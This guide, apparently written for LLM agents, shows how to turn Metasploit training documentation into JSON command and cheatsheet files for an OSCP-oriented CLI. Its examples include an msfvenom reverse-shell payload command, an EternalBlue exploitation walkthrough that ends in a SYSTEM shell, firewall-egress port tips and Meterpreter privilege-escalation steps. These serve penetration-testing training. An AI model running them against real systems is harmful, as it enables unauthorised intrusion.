# LLM Guide: Converting Documentation to Structured Cheatsheets

## Executive Summary

**Task:** Convert unstructured technical documentation (manuals, training materials, blog posts) into two complementary JSON structures:
1. **Command Files** - Atomic, reusable command definitions
2. **Cheatsheet Files** - Scenario-based learning workflows

**Efficiency Key:** Plan first, understand schemas deeply, batch create, validate incrementally.

**Real Example:** Converted 40+ pages of Metasploit Framework documentation into 12 JSON files (88 commands + 24 scenarios) in ~2 hours of focused work.

---

## Phase 1: Planning & Schema Comprehension (15-20% of time)

### Step 1.1: Research Project Structure

**Before writing ANY content, understand the system:**

```bash
# Read these files in order (use Read tool):
1. Project architecture docs (CLAUDE.md, README.md)
2. Existing schemas (*.schema.json)
3. 2-3 existing examples (pick high-quality ones)
4. Integration documentation (how files are loaded/used)
```

**Example from Metasploit project:**
```
✓ Read: reference/data/schemas/command.schema.json (required fields, validation rules)
✓ Read: reference/data/commands/file-transfer/rdesktop.json (command structure example)
✓ Read: reference/data/schemas/cheatsheet.schema.json (scenario requirements)
✓ Read: reference/data/cheatsheets/quick-wins.json (scenario format example)
✓ Read: reference/CLAUDE.md (integration patterns, placeholder system)
```

### Step 1.2: Identify Separation of Concerns

**Key Decision:** What goes in commands vs cheatsheets?

**Commands (Atomic Building Blocks):**
- Single command with flags/options
- Reusable across multiple scenarios
- Self-contained (no workflow dependencies)
- Example: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o shell.exe`

**Cheatsheets (Workflow Narratives):**
- Multi-step scenarios with context
- Reference commands by ID (don't duplicate command text)
- Real-world use cases with explanations
- Example: "Scenario 1: Exploiting MS17-010 - Steps 1-10 using commands [msf-use-module, msf-set-payload, ...]"

**Rule of Thumb:** If it's a single CLI command → Command file. If it's a story/workflow → Cheatsheet.

### Step 1.3: Create File Structure Plan

**Ask the user for scope clarification if documentation is large:**

```python
# Use AskUserQuestion tool to scope work
questions = [
    {
        "question": "How many cheatsheets should we create?",
        "header": "Scope",
        "options": [
            {"label": "All X cheatsheets", "description": "Comprehensive coverage"},
            {"label": "Core Y only", "description": "Essential topics"},
            {"label": "Custom selection", "description": "Specify which topics"}
        ]
    },
    {
        "question": "What level of detail?",
        "header": "Detail",
        "options": [
            {"label": "Verbose", "description": "Extensive examples, edge cases"},
            {"label": "Balanced", "description": "Moderate detail, practical focus"},
            {"label": "Minimal", "description": "Essential info only"}
        ]
    }
]
```

**Output a structured plan:**

```markdown
## Plan: 12 Files (6 Commands + 6 Cheatsheets)

### Commands (Bottom-Up):
1. metasploit-core.json (~12 commands) - Database, workspace, search
2. metasploit-auxiliary.json (~10 commands) - Scanning modules
3. metasploit-exploits.json (~12 commands) - Exploitation workflow
4. metasploit-payloads.json (~18 commands) - msfvenom payload generation
5. metasploit-handlers.json (~10 commands) - Session management
6. metasploit-meterpreter.json (~22 commands) - Post-exploitation

### Cheatsheets (Top-Down):
1. metasploit-basics.json (4 scenarios) - Setup, workspace, import
2. metasploit-scanning.json (4 scenarios) - Service enumeration
3. metasploit-exploitation.json (4 scenarios) - Exploitation patterns
4. metasploit-payloads.json (4 scenarios) - Payload delivery
5. metasploit-post-exploit.json (5 scenarios) - Meterpreter operations
6. metasploit-automation.json (3 scenarios) - Resource scripts

**Creation Order:** Commands first (atomic), then cheatsheets (reference commands by ID)
```

**Get user approval with ExitPlanMode before proceeding.**

---

## Phase 2: Command File Creation (40-50% of time)

### Step 2.1: Command Extraction Pattern

**For each command in source documentation:**

1. **Identify command syntax** (the actual CLI string)
2. **Extract all placeholders** (anything that varies per use: IPs, ports, filenames)
3. **Document flags/options** (what each flag does, not just what it's called)
4. **Find success/failure indicators** (how to know if it worked)
5. **Note prerequisites** (what must happen first)
6. **List alternatives** (manual methods when tool fails)

**Template (use this structure):**

```json
{
  "id": "descriptive-kebab-case",
  "name": "Human Readable Name",
  "category": "main-category",
  "subcategory": "optional-subcategory",
  "command": "actual-command --flag <PLACEHOLDER>",
  "description": "One sentence what this does",
  "tags": ["UPPERCASE_TAG", "CATEGORY", "OSCP:HIGH"],
  "variables": [
    {
      "name": "<PLACEHOLDER>",
      "description": "What this represents",
      "example": "default_value_or_common_example",
      "required": true|false
    }
  ],
  "flag_explanations": {
    "--flag": "Educational explanation of what this flag does and WHY you'd use it"
  },
  "success_indicators": [
    "Exact output string that means success",
    "Pattern to look for in output"
  ],
  "failure_indicators": [
    "Error message patterns",
    "What wrong output looks like"
  ],
  "next_steps": [
    "command-id-to-run-after-this",
    "another-command-id"
  ],
  "alternatives": [
    "manual-command-id-without-metasploit"
  ],
  "prerequisites": [
    "command-id-to-run-before-this"
  ],
  "troubleshooting": {
    "common_error": "Solution explanation"
  },
  "notes": "Additional context, OSCP tips, edge cases",
  "oscp_relevance": "low|medium|high"
}
```

### Step 2.2: Placeholder Strategy

**Critical Rule:** NEVER hardcode values that vary per engagement.

**Examples:**

```json
// ✗ WRONG - Hardcoded IP
"command": "nmap -p 3389 192.168.1.100"

// ✓ CORRECT - Placeholders with variables
"command": "nmap -p <PORT> <TARGET>",
"variables": [
  {
    "name": "<PORT>",
    "description": "RDP port (default 3389)",
    "example": "3389",
    "required": false
  },
  {
    "name": "<TARGET>",
    "description": "Target IP address or hostname",
    "example": "192.168.45.100",
    "required": true
  }
]
```

**Placeholder Naming Convention:**
- Format: `<UPPERCASE_NAME>`
- Common placeholders: `<TARGET>`, `<LHOST>`, `<LPORT>`, `<USERNAME>`, `<PASSWORD>`, `<PORT>`
- Auto-filled by system if defined in config

### Step 2.3: Educational Context (The "Why")

**Don't just document commands - teach methodology.**

**Example of insufficient documentation:**
```json
"flag_explanations": {
  "-v": "Verbose mode"
}
```

**Example of educational documentation:**
```json
"flag_explanations": {
  "-v": "Verbose output - Shows packet-level details as scan progresses. Critical for troubleshooting (shows filtered vs closed ports, timing info, firewall responses). Always use in OSCP for visibility.",
  "-Pn": "Skip ping - Treats host as alive even if ICMP blocked. Required when target firewall drops ping packets (common in enterprise environments). Trade-off: Slower scans (no early termination for dead hosts)."
}
```

**Include:**
- What the flag does (technical)
- Why you'd use it (tactical)
- When to use it (situational)
- Trade-offs (OSCP exam time vs thoroughness)

### Step 2.4: Batch Creation Efficiency

**Pattern for creating 10-20 commands in one file:**

1. **Single message, single Write tool call** (don't create one command per message)
2. **Copy-paste template structure** (maintain consistency)
3. **Fill in order:** id → name → command → description → variables → flags → indicators → notes
4. **Use source documentation as reference** (don't invent, extract)
5. **Mark common fields once** (category, subcategory apply to all commands in file)

**Anti-pattern (slow):**
- Create 1 command → validate → create next command → validate → ...

**Efficient pattern (fast):**
- Create all 20 commands in file → validate entire file once → fix errors in batch

---

## Phase 3: Cheatsheet File Creation (30-40% of time)

### Step 3.1: Scenario-Based Structure

**Cheatsheets are NOT command lists - they're narratives with context.**

**Required Components:**

```json
{
  "id": "cheatsheet-topic",
  "name": "Human Readable Cheatsheet Title",
  "description": "What this cheatsheet covers (1-2 sentences)",
  "educational_header": {
    "how_to_recognize": [
      "Indicator 1 that you should use this technique",
      "Indicator 2 (service banner, vulnerability type, etc.)"
    ],
    "when_to_look_for": [
      "Situation 1 (phase of engagement, time constraint)",
      "Situation 2 (tool availability, network restrictions)"
    ]
  },
  "scenarios": [ /* 3-5 detailed scenarios */ ],
  "sections": [ /* Phased command execution */ ],
  "tags": ["TOPIC", "CATEGORY", "OSCP:HIGH"]
}
```

### Step 3.2: Scenario Writing Pattern

**Each scenario must tell a complete story:**

```json
{
  "title": "Scenario X: Context - Specific Goal",
  "context": "Setup: What environment, what access, what's the objective. Be specific.",
  "approach": "Step 1: Command with explanation. Step 2: ... Step N: Verification. Include reasoning between steps.",
  "commands": [
    "command-id-from-command-file-1",
    "command-id-from-command-file-2"
  ],
  "expected_outcome": "What success looks like. Actual output examples. Time estimates. Common issues and solutions.",
  "why_this_works": "Technical deep-dive. Protocol explanation. Why this vulnerability exists. Defensive considerations. OSCP frequency/relevance."
}
```

**Example from Metasploit project:**

```json
{
  "title": "Scenario 1: Basic Exploitation Workflow - SMB MS17-010 (EternalBlue)",
  "context": "Target: Windows Server 2008 R2 (192.168.45.100), SMB port 445 open. Auxiliary scan confirmed vulnerable to MS17-010. Goal: Exploit EternalBlue to gain SYSTEM shell.",
  "approach": "Step 1: Confirm vulnerability: use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS 192.168.45.100; run (should show 'Host is VULNERABLE'). Step 2: Select exploit module: use exploit/windows/smb/ms17_010_eternalblue. Step 3: View required options: show options (note RHOSTS required). [... 10 detailed steps ...]",
  "commands": [
    "msf-aux-smb-ms17010",
    "msf-use-module",
    "msf-show-options",
    "msf-set-payload",
    "msf-exploit-run"
  ],
  "expected_outcome": "check command shows: '[+] 192.168.45.100:445 - The target is vulnerable'. exploit shows: '[*] Started reverse TCP handler on 192.168.45.5:4444, [*] Meterpreter session 1 opened'. Time: 30-90 seconds from module selection to shell. [... failure scenarios, troubleshooting ...]",
  "why_this_works": "MS17-010 (CVE-2017-0144) exploits: SMBv1 buffer overflow in srv.sys driver, Allows remote code execution without authentication. [... 3-4 paragraphs of technical depth, OSCP tips, alternatives ...]"
}
```

### Step 3.3: Command Referencing (Critical)

**Never duplicate command text in cheatsheets - reference by ID:**

```json
// ✗ WRONG - Duplicating command definition
"commands": [
  "msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.5 ..."
]

// ✓ CORRECT - Referencing command ID
"commands": [
  "msfvenom-windows-reverse",
  "msf-handler-setup",
  "msf-sessions-list"
]
```

**Why:**
- Commands can be updated in one place (DRY principle)
- Cheatsheets remain valid when command syntax changes
- CLI can cross-reference (show command details from cheatsheet)

### Step 3.4: Educational Depth Balance

**Target audience:** Penetration tester who knows basics but needs tactical guidance.

**Too shallow (avoid):**
```
"why_this_works": "EternalBlue is a Windows SMB vulnerability that allows remote code execution."
```

**Too deep (avoid unless highly relevant):**
```
"why_this_works": "The vulnerability exists in the SrvOs2FeaListSizeToNt function at offset 0x14007958 in srv.sys. When processing SMB1 NT Trans requests, insufficient bounds checking on the FEA list size parameter allows heap overflow. The exploit leverages Hawai Manager for heap grooming, overwrites function pointers in srvnet.sys..."
```

**Balanced (target this):**
```
"why_this_works": "MS17-010 (CVE-2017-0144) exploits SMBv1 buffer overflow in srv.sys driver. The vulnerability allows remote code execution without authentication on Windows Vista through Server 2008 R2 (pre-patch).

Exploit mechanics:
1) Send crafted SMB packets triggering buffer overflow
2) Overwrite kernel memory to gain SYSTEM privileges
3) Execute staged payload (Meterpreter) in privileged context
4) Payload connects back to handler

Payload staging: The exploit uses staged payloads (smaller initial shellcode) indicated by forward slash in payload name (windows/x64/meterpreter/reverse_tcp). Handler must match exactly.

OSCP notes: EternalBlue highly reliable (rank: excellent), works on unpatched Windows 7/Server 2008 R2 (common in labs), firewall often blocks default port 4444 (use ports 80, 443, 53 for better egress).

Troubleshooting: If exploit hangs, try different target architecture. If no session created, verify payload matches handler (staged vs non-staged)."
```

### Step 3.5: Sections for Phase-Based Workflow

**After scenarios, organize commands by execution phase:**

```json
"sections": [
  {
    "title": "Phase 1: Initial Enumeration (First 5 Minutes)",
    "notes": "Run these immediately after gaining access. Gather basic system info before advanced exploitation. Estimated time: 2-3 minutes.",
    "commands": [
      "meterpreter-sysinfo",
      "meterpreter-getuid",
      "meterpreter-ps"
    ]
  },
  {
    "title": "Phase 2: Privilege Escalation (If Not SYSTEM)",
    "notes": "Try getsystem first (fast). If fails, use exploit suggester (slower but comprehensive). Estimated time: 1-5 minutes.",
    "commands": [
      "meterpreter-getsystem",
      "msf-exploit-suggester"
    ]
  }
]
```

**Benefits:**
- Tactical workflow guidance (do this, then that)
- Time estimates for OSCP exam planning
- Progressive disclosure (basic → advanced)

---

## Phase 4: Validation & Testing (10-15% of time)

### Step 4.1: Incremental Validation

**Validate in batches, not at the very end:**

```bash
# After creating 2-3 command files
python3 -m json.tool file1.json > /dev/null && echo "✓ Valid"
python3 -m json.tool file2.json > /dev/null && echo "✓ Valid"

# Fix syntax errors immediately (commas, brackets, quotes)
```

**Common JSON errors:**
- Missing comma between objects in array
- Trailing comma after last item (invalid in JSON)
- Unescaped quotes in strings (use `\"` or avoid quotes)
- Unclosed brackets/braces

### Step 4.2: Schema Validation (If Available)

**If project has schema validators, use them:**

```bash
# Example validation command
crack reference --validate

# Or custom validation script
python3 validate_commands.py reference/data/commands/
```

### Step 4.3: CLI Integration Testing

**Test that commands are accessible via CLI:**

```bash
# Search functionality
crack reference metasploit | head -20

# Specific command lookup
crack reference msf-db-init
crack reference msfvenom-windows-reverse

# Verify output format (colors, placeholders, autofill working)
```

### Step 4.4: Quality Checklist

Before marking complete, verify:

- [ ] All command IDs unique across files
- [ ] All placeholders (`<VARIABLE>`) have corresponding variable definitions
- [ ] All command references in cheatsheets exist in command files
- [ ] No hardcoded IPs, ports, or environment-specific values
- [ ] Educational context present (flag_explanations have "why" not just "what")
- [ ] Success/failure indicators specific (actual output strings, not vague)
- [ ] OSCP relevance appropriate (high/medium/low based on exam frequency)
- [ ] Troubleshooting sections address common real-world errors
- [ ] Time estimates included where relevant (exam time management)
- [ ] Manual alternatives provided (tools fail, need backup methods)

---

## Efficiency Tips & Patterns

### Tip 1: Use TodoWrite for Progress Tracking

**Update todos at completion boundaries:**

```python
# Start of work
TodoWrite([
  {"content": "Create command file X", "status": "in_progress", ...},
  {"content": "Create command file Y", "status": "pending", ...},
  ...
])

# After completing file X
TodoWrite([
  {"content": "Create command file X", "status": "completed", ...},
  {"content": "Create command file Y", "status": "in_progress", ...},
  ...
])
```

**Don't update after every single command - update after each FILE.**

### Tip 2: Parallel Tool Calls

**When validating multiple files:**

```python
# ✓ CORRECT - Parallel validation (single message, multiple tool calls)
Bash("python3 -m json.tool file1.json > /dev/null")
Bash("python3 -m json.tool file2.json > /dev/null")
Bash("python3 -m json.tool file3.json > /dev/null")

# ✗ WRONG - Sequential messages (slow)
# Message 1: Validate file1
# Message 2: Validate file2
# Message 3: Validate file3
```

### Tip 3: Template Reuse

**Create a working command, then copy-paste-modify:**

```json
// First command (write carefully)
{
  "id": "msf-db-init",
  "name": "Initialize Metasploit Database",
  ...all fields...
}

// Next 19 commands (copy structure, fill different values)
{
  "id": "msf-db-status",
  "name": "Check Database Status",
  ...same structure, different content...
}
```

**Maintain exact field order for consistency and easier review.**

### Tip 4: Extract Don't Invent

**Use source documentation verbatim where appropriate:**

```markdown
Source doc: "The -v flag enables verbose output, showing packet-level details."

Command file:
"flag_explanations": {
  "-v": "Verbose output - Shows packet-level details as scan progresses..."
}
```

**Add educational context, but preserve technical accuracy from source.**

### Tip 5: Batch Creation Messages

**Single message can create entire file:**

```
User: "Create metasploit-core.json with 20 commands"

LLM Response:
[Reads schema and examples first]
[Single Write tool call with complete 20-command JSON file]
[Single Bash validation call]
[Update todo]

Time: 2-3 minutes for 20 commands in one file
```

**Not:**
```
User: "Create metasploit-core.json"

LLM: Creates command 1
LLM: Creates command 2
...
LLM: Creates command 20

Time: 40-60 minutes (inefficient)
```

---

## Common Pitfalls & Solutions

### Pitfall 1: Over-Planning

**Symptom:** Spending 30+ minutes planning file structure for 6 files

**Solution:**
- 10-15 minutes max for planning phase
- Get user approval on high-level structure
- Iterate during creation (don't need perfect plan up front)

### Pitfall 2: Premature Optimization

**Symptom:** Trying to make first command "perfect" before moving to next

**Solution:**
- Create all commands in file with "good enough" quality
- Validate JSON syntax
- Refine during review phase if needed
- Speed > perfection in initial draft

### Pitfall 3: Reinventing Structure

**Symptom:** Creating new field names, changing schema structure

**Solution:**
- **FOLLOW THE SCHEMA EXACTLY** - Don't add custom fields
- Use existing examples as templates
- If schema seems insufficient, ask user (don't modify on your own)

### Pitfall 4: Duplicating Commands in Cheatsheets

**Symptom:** Copying full command text into cheatsheet scenarios

**Solution:**
- **Reference by ID only:** `"commands": ["msf-db-init", "msf-use-module"]`
- Never include command text in cheatsheet (that's what command files are for)
- CLI will cross-reference automatically

### Pitfall 5: Shallow Educational Content

**Symptom:** Flag explanations like: `"-v": "Verbose mode"`

**Solution:**
- Explain WHAT it does technically
- Explain WHY you'd use it tactically
- Explain WHEN to use it situationally
- Include trade-offs (speed vs stealth, reliability vs evasion)

### Pitfall 6: Hardcoded Values

**Symptom:** `"command": "nmap 192.168.1.100"`

**Solution:**
- **ALL variable values become placeholders:** `"command": "nmap <TARGET>"`
- Define in variables array with examples
- System will auto-fill from config where possible

---

## Real-World Example: Metasploit Conversion

**Source:** 40 pages of Metasploit Framework training documentation

**Output:** 12 JSON files (6 commands + 6 cheatsheets)

**Timeline:**
- Planning & schema review: 25 minutes
- Command file creation (88 commands): 60 minutes
- Cheatsheet creation (24 scenarios): 50 minutes
- Validation & testing: 15 minutes
- **Total: ~2.5 hours**

**Efficiency Gains:**
- Single message per file (6 messages for 6 command files, not 88 messages)
- Parallel validation (all files at once)
- Template reuse (copy first command structure for subsequent commands)
- Schema compliance from start (no rework needed)

**Quality Metrics:**
- All 12 files valid JSON (no syntax errors)
- All commands accessible via CLI
- All placeholders defined
- All scenarios reference existing command IDs
- Educational depth appropriate for target audience

---

## Execution Checklist

Use this checklist when starting a new documentation conversion project:

### Pre-Work
- [ ] Read project CLAUDE.md / README
- [ ] Read command.schema.json and cheatsheet.schema.json
- [ ] Read 2-3 high-quality existing examples
- [ ] Understand placeholder system and auto-fill behavior
- [ ] Understand CLI integration (how files are loaded/used)

### Planning
- [ ] Ask user for scope (all topics vs selective)
- [ ] Ask user for detail level (verbose/balanced/minimal)
- [ ] Create file structure plan (commands + cheatsheets)
- [ ] Estimate command counts per file
- [ ] Get user approval with ExitPlanMode

### Command Creation
- [ ] Create all command files first (bottom-up approach)
- [ ] Use single Write call per file (batch creation)
- [ ] Follow schema exactly (no custom fields)
- [ ] Extract placeholders (no hardcoded IPs/ports/paths)
- [ ] Add educational context (why, when, trade-offs)
- [ ] Include troubleshooting sections
- [ ] Validate JSON syntax after each file
- [ ] Update todos after each file completion

### Cheatsheet Creation
- [ ] Create cheatsheet files second (top-down approach)
- [ ] Write scenario narratives (context, approach, outcome, why)
- [ ] Reference command IDs only (no command text duplication)
- [ ] Include educational headers (how to recognize, when to use)
- [ ] Organize sections by execution phase
- [ ] Add time estimates for OSCP relevance
- [ ] Validate JSON syntax after each file
- [ ] Update todos after each file completion

### Validation & Testing
- [ ] Validate all JSON files (python -m json.tool)
- [ ] Test CLI access (crack reference <keyword>)
- [ ] Verify specific command lookups work
- [ ] Check cross-references (cheatsheet command IDs exist in command files)
- [ ] Review quality checklist
- [ ] Mark all todos as completed
- [ ] Generate completion summary

---

## Final Tips for LLMs

1. **Front-load the research** - 20% of time on understanding system saves 80% of rework
2. **Batch everything** - Single message per file, not per command
3. **Follow schemas religiously** - Don't invent new structures
4. **Reference, don't duplicate** - Commands go in command files, cheatsheets reference by ID
5. **Educate, don't just document** - Explain the "why" and "when", not just the "what"
6. **Validate incrementally** - After each file, not at the end
7. **Use todos for tracking** - Update at file boundaries, not per-command
8. **Ask for clarification early** - Scope and detail level affect structure decisions

**Remember:** You're not just converting text to JSON - you're creating an educational resource that teaches methodology and builds muscle memory for practical penetration testing.

---

## Appendix: Quick Reference

### Command File Minimal Template
```json
{
  "category": "main-category",
  "commands": [
    {
      "id": "unique-id",
      "name": "Display Name",
      "category": "same-as-file",
      "command": "cmd --flag <PLACEHOLDER>",
      "description": "What it does",
      "tags": ["TAG1", "OSCP:HIGH"],
      "variables": [
        {"name": "<PLACEHOLDER>", "description": "...", "example": "...", "required": true}
      ],
      "flag_explanations": {"--flag": "Why use this flag"},
      "success_indicators": ["What success looks like"],
      "failure_indicators": ["What failure looks like"],
      "next_steps": ["command-id-after"],
      "alternatives": ["manual-method-id"],
      "prerequisites": ["command-id-before"],
      "troubleshooting": {"error": "solution"},
      "notes": "Additional context",
      "oscp_relevance": "high"
    }
  ]
}
```

### Cheatsheet Minimal Template
```json
{
  "id": "cheatsheet-id",
  "name": "Cheatsheet Title",
  "description": "What this covers",
  "educational_header": {
    "how_to_recognize": ["Indicator 1", "Indicator 2"],
    "when_to_look_for": ["Situation 1", "Situation 2"]
  },
  "scenarios": [
    {
      "title": "Scenario 1: Context - Goal",
      "context": "Environment setup and objective",
      "approach": "Step 1: ... Step 2: ... Step N: ...",
      "commands": ["cmd-id-1", "cmd-id-2"],
      "expected_outcome": "Success indicators and troubleshooting",
      "why_this_works": "Technical explanation and OSCP relevance"
    }
  ],
  "sections": [
    {
      "title": "Phase 1: Description",
      "notes": "Guidance and time estimates",
      "commands": ["cmd-id-1", "cmd-id-2"]
    }
  ],
  "tags": ["CATEGORY", "OSCP:HIGH"]
}
```

### Validation Commands
```bash
# JSON syntax
python3 -m json.tool file.json > /dev/null && echo "✓ Valid"

# CLI integration
crack reference <keyword>
crack reference <command-id>

# Count commands
jq '.commands | length' command-file.json

# Count scenarios
jq '.scenarios | length' cheatsheet-file.json
```